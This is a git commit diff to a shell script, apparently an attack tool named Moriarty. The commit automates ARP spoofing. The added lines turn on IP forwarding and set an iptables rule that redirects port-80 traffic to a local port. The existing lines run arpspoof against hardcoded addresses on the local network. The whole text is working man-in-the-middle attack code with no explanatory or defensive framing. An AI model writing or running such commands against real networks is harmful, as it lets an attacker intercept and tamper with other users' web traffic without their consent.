b3a2269b27a1a7edfe8e4f206c79b724acf04e3b
Sathya Prakash <sathyaprakash222@gmail.com>
2014-01-11 04:12:55 +0100

    Automate arpspoof misc

--- Moriarty/Moriarty.sh
+++ Moriarty/Moriarty.sh
@@ -1,5 +1,9 @@
 #!/bin/sh
 
+#prepare arpspoofing
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1024
+
 #start arpsoofing
 nohup arpspoof -i wlan0 -t 172.29.225.241 172.29.225.9 &
 
